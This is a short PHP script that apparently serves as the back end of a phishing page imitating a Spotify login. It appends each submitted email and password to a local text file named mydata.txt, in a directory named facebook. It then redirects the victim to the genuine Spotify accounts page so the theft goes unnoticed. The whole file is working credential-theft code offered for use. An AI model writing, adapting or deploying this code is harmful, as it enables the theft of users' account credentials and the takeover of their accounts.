<?php

file_put_contents("../facebook/mydata.txt", "SPOTIFY Username: " . $_POST['email'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.spotify.com/');
exit();
                                                                  
